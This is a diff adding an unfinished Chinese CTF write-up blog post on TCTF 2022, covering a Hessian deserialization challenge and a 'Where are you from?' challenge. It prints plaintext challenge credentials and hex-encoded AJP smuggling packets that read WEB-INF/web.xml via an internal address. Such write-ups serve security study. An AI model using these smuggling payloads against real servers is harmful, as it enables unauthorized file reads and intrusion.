@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="WEBhessian-onlyJdk没见过 嗯写试试 只能先看dockerfile理解一下 12345678http:&#x2F;&#x2F;202.120.7.213:8090http:&#x2F;&#x2F;202.120.7.213:8091http:&#x2F;&#x2F;202.120.7.213:8092overseahttp:&#x2F;&#x2F;47.90.137.5:8090hessian-onlyJdk.zipThe server resets ev">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF-2022">
+<meta property="og:url" content="http://example.com/2022/09/17/TCTF-2022/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="WEBhessian-onlyJdk没见过 嗯写试试 只能先看dockerfile理解一下 12345678http:&#x2F;&#x2F;202.120.7.213:8090http:&#x2F;&#x2F;202.120.7.213:8091http:&#x2F;&#x2F;202.120.7.213:8092overseahttp:&#x2F;&#x2F;47.90.137.5:8090hessian-onlyJdk.zipThe server resets ev">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/17/TCTF-2022/image-20220918194053259.png">
+<meta property="article:published_time" content="2022-09-17T10:35:05.000Z">
+<meta property="article:modified_time" content="2022-09-18T19:12:04.672Z">
+<meta property="article:author" content="b1ue0cean">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/17/TCTF-2022/image-20220918194053259.png">
+
+
+<link rel="canonical" href="http://example.com/2022/09/17/TCTF-2022/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/09/17/TCTF-2022/","path":"2022/09/17/TCTF-2022/","title":"TCTF-2022"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>TCTF-2022 | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">102</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">79</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">143</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hessian-onlyJdk"><span class="nav-number">1.1.</span> <span class="nav-text">hessian-onlyJdk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Where-are-you-from"><span class="nav-number">1.2.</span> <span class="nav-text">Where are you from?</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">143</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">102</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/TCTF-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="TCTF-2022 | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCTF-2022
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-17 18:35:05" itemprop="dateCreated datePublished" datetime="2022-09-17T18:35:05+08:00">2022-09-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-19 03:12:04" itemprop="dateModified" datetime="2022-09-19T03:12:04+08:00">2022-09-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="hessian-onlyJdk"><a href="#hessian-onlyJdk" class="headerlink" title="hessian-onlyJdk"></a>hessian-onlyJdk</h2><p>没见过 嗯写试试</p>
+<p>只能先看dockerfile理解一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://202.120.7.213:8090</span><br><span class="line">http://202.120.7.213:8091</span><br><span class="line">http://202.120.7.213:8092</span><br><span class="line">oversea</span><br><span class="line">http://47.90.137.5:8090</span><br><span class="line">hessian-onlyJdk.zip</span><br><span class="line">The server resets every 5 minutes</span><br><span class="line">reference 1 reference 2</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-slim</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser ctf &amp;&amp; addgroup ctfgroup &amp;&amp; adduser ctf ctfgroup</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /opt/app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hessian-onlyJdk.jar /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> JavaUtils.class /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> jvmtiagent.so /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-agentpath:/opt/app/jvmtiagent.so=/opt/app/JavaUtils.class&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/opt/app/hessian-onlyJdk.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:<span class="symbol">&lt;libname&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              加载本机代理库 <span class="symbol">&lt;libname&gt;</span>, 例如 -agentli<span class="variable">b:hprof</span></span><br><span class="line">              另请参阅 -agentli<span class="variable">b:jdwp</span>=<span class="keyword">help</span> 和 -agentli<span class="variable">b:hprof</span>=<span class="keyword">help</span></span><br><span class="line">-agentpath:<span class="symbol">&lt;pathname&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              按完整路径名加载本机代理库</span><br><span class="line">-javaagent:<span class="symbol">&lt;jarpath&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure>
+
+<p>好像应该没啥用</p>
+<p>估计要rce</p>
+<p>来看一下这个入口文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.hessian.onlyJdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Index</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        MyHandler() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to 0CTF 2022!&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">                input.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                var5.printStackTrace();</span><br><span class="line">                response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Where-are-you-from"><a href="#Where-are-you-from" class="headerlink" title="Where are you from?"></a>Where are you from?</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">202.120</span>.<span class="number">7.207</span> <span class="number">2333</span> Entry your team token to create a challenge container.</span><br><span class="line">Customer service staff : @llllIII||IIIllIl||IIIll||IIllll<span class="comment">#1086</span></span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span><span class="number">43.155</span>.<span class="number">107.208</span>:<span class="number">31015</span><span class="regexp">/ctf/</span></span><br><span class="line">u: r3kapig</span><br><span class="line">p: hof6YMxTY8AhORO5W42xp5aUOPBFuUhv</span><br><span class="line"></span><br><span class="line">    Welcome, r3kapig! Where are you from?</span><br><span class="line">    Server:     http:<span class="regexp">//</span><span class="number">43.155</span>.<span class="number">107.208</span>:<span class="number">31014</span><span class="regexp">/ctf/</span></span><br><span class="line">    Username:   r3kapig</span><br><span class="line">    Password:   U4vSQGuXOfUFPVFkadSYAlvQHFA0nwc2</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123400010</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/17/TCTF-2022/image-20220918194053259.png" alt="image-20220918194053259"></p>
+<p>走私。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>现在要把 所有的 <code>127.0.0.1</code> 替换成  内网地址 <code>3132372e302e302e31</code></p>
+<p>替换成内网的地址的hex <code>31302e3233332e302e3131</code></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>长度还没改。。。</p>
+<p>修改为正确长度 0187</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018702020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>先用content-length试一下</p>
+<p>31302e3233332e302e3131</p>
